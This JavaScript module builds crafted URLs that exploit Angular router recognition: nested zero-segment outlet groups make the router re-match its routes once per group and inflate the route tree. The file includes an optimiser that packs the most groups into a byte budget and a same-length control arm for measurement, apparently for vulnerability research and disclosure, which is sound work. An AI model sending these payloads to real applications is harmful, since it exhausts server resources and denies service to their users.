// One request URL, one attacker-chosen dimension, and a route configuration the
// application already has:
//
//   nested zero-segment outlet groups  x  routes that match the replayed siblings
//
// A parenthesised group that consumes no segments of its own is transparent to
// recognition. processSegmentGroup() (_router-chunk.mjs:3076) sees zero segments
// and children, and hands the group straight to processChildren() with the SAME
// config array and the SAME parentRoute:
//
//   if (segmentGroup.segments.length === 0 && segmentGroup.hasChildren()) {
//     return this.processChildren(injector, config, segmentGroup, parentRoute);
//   }
//
// So the wrapper costs no configured level and creates no node of its own, and
// its contents are matched against the same routes all over again. Nest and
// branch those wrappers and the same route array is matched once per group, every
// match succeeding and every match landing in the snapshot tree.
//
// The URL grows LINEARLY with the number of groups, because the URL literally
// contains each one.

// Wrapper outlet names. One character each, and reusable between levels: a
// wrapper only has to be distinguishable from its OWN siblings, because
// UrlSegmentGroup.children is a map keyed by outlet name and parseParens()
// (_router-chunk.mjs:590) assigns into it. "a" is left out because that is the
// configured named outlet the replayed sibling set uses.
const WRAPPER_NAMES =
  "xywvutsrqponmlkjihgfedcbZYXWVUTSRQPONMLKJIHGFEDCB".split("");

// The set of siblings that every group replays.
//
//   prim = false   "a:1"        one node per group: the ONE-ROUTE configuration
//   prim = true    "1//a:1"     two nodes per group: primary plus the named one
//
// The single-route shapes have no primary route to match, so a primary sibling
// there makes the whole recognition fail with NoMatch before it fans out. The
// generator takes that from the shape rather than guessing.
function siblingSet({ prim, outlet }) {
  return prim ? `1//${outlet}:1` : `${outlet}:1`;
}

// The control keeps every byte, every group and every parsed outlet, and changes
// only how many DISTINCT names the siblings of a group end up with. Wrapper names
// are one character in both arms, so the two URLs are the same length to the byte.
//
// Same-named siblings overwrite each other in UrlSegmentGroup.children, so the
// control's b wrappers per group collapse to one and the replay goes from
// sum(b^i) groups to d + 1. That isolates the replay from the parse: the control
// is the same syntax, the same size and the same number of declared outlets.
function wrapperName(index, mode) {
  return mode === "control" ? WRAPPER_NAMES[0] : WRAPPER_NAMES[index % WRAPPER_NAMES.length];
}

// groups(b, d) = sum of b^i for i in 0..d.
export function groupCount(branches, depth) {
  let total = 0;
  let level = 1;
  for (let i = 0; i <= depth; i++) {
    total += level;
    level *= branches;
  }
  return total;
}

// group(0, i) = NAME ":/(" sibs ")"
// group(k, i) = NAME ":/(" sibs "//" group(k-1,0) "//" ... "//" group(k-1,b-1) ")"
// URL         = "/" shape "/(" sibs "//" group(d-1,0) "//" ... "//" group(d-1,b-1) ")"
//
// The four characters of ":/(" plus ")" are what make the group a zero-segment
// one. "NAME:z" or "NAME:/" would give the parser a child per wrapper too, but
// the child would carry a segment and processSegmentGroup would take the
// processSegment branch instead: no replay.
export function buildTarget({
  shape,
  mode = "candidate",
  branches,
  depth,
  prim = false,
  outlet = "a",
  noSep = false,
}) {
  const sibs = siblingSet({ prim, outlet });

  // ")" already terminates a group, so the "//" between sibling wrapper groups
  // is optional and worth 2 bytes each. The one between the replayed sibling set
  // and the first wrapper is not: "detail:1x:" would read as outlet "detail"
  // carrying the segment "1x".
  const sep = noSep ? "" : "//";

  const group = (k, i) => {
    const name = wrapperName(i, mode);
    if (k === 0) return `${name}:/(${sibs})`;
    const kids = Array.from({ length: branches }, (_, j) => group(k - 1, j)).join(sep);
    return `${name}:/(${sibs}//${kids})`;
  };

  if (depth <= 0) return `/${shape}/(${sibs})`;

  const kids = Array.from({ length: branches }, (_, j) => group(depth - 1, j)).join(sep);
  return `/${shape}/(${sibs}//${kids})`;
}

// The single-dimension arm: the replayed sibling set with no named outlet in it,
// only a primary. Report the wrapper tree with nothing for it to duplicate.
export function buildPrimaryOnly({ shape, branches, depth, mode = "candidate" }) {
  const sibs = "1";
  const group = (k, i) => {
    const name = wrapperName(i, mode);
    if (k === 0) return `${name}:/(${sibs})`;
    const kids = Array.from({ length: branches }, (_, j) => group(k - 1, j)).join("//");
    return `${name}:/(${sibs}//${kids})`;
  };
  if (depth <= 0) return `/${shape}/(${sibs})`;
  const kids = Array.from({ length: branches }, (_, j) => group(depth - 1, j)).join("//");
  return `/${shape}/(${sibs}//${kids})`;
}

// Picks the (branches, depth) pair that fits the most groups into a byte budget.
// Bytes per group are nearly constant, so what decides is how many groups fit;
// high branching with low depth wins, and depth never has to approach the
// parser's own depth > 50 guard (_router-chunk.mjs:484).
export function bestShape({ budget, shape, prim, outlet = "a", mode = "candidate" }) {
  let best = null;
  for (let branches = 2; branches <= 24; branches++) {
    for (let depth = 1; depth <= 12; depth++) {
      const groups = groupCount(branches, depth);
      if (groups > 40000) continue;
      const url = buildTarget({ shape, mode, branches, depth, prim, outlet });
      const bytes = Buffer.byteLength(url);
      if (bytes > budget) continue;
      if (!best || groups > best.groups || (groups === best.groups && bytes < best.bytes)) {
        best = { branches, depth, groups, bytes };
      }
    }
  }
  return best;
}

// A flat group of distinct outlet names: /res/(a:1//b:1//c:1//...).
//
// This is NOT the nested replay. It drives the empty-path outlet exemption in
// processSegmentAgainstRoute (:3123), where a path:'' route in the primary
// outlet matches every named outlet the URL declares. That inflation belongs to
// angular/angular#70932; it is here only because the resources amplifier needs
// an inflated tree to sit on, and this is the smallest one that produces it.
// Shortest distinct spellings: a, b, ... z, aa, ab, ...
function flatName(i) {
  let s = "";
  let n = i;
  do {
    s = String.fromCharCode(97 + (n % 26)) + s;
    n = Math.floor(n / 26) - 1;
  } while (n >= 0);
  return s;
}

export function buildFlat({ shape, count, mode = "candidate" }) {
  const names = Array.from({ length: count }, (_, i) =>
    // The control keeps every byte and every declared outlet, and changes only
    // how many distinct names there are, so same-named outlets overwrite.
    mode === "control" ? "a".repeat(flatName(i).length) : flatName(i),
  );
  // An empty shape gives the root URL their lab uses: /(a:1//b:1//...).
  const prefix = shape ? "/" + shape : "";
  return prefix + "/(" + names.map((n) => n + ":1").join("//") + ")";
}
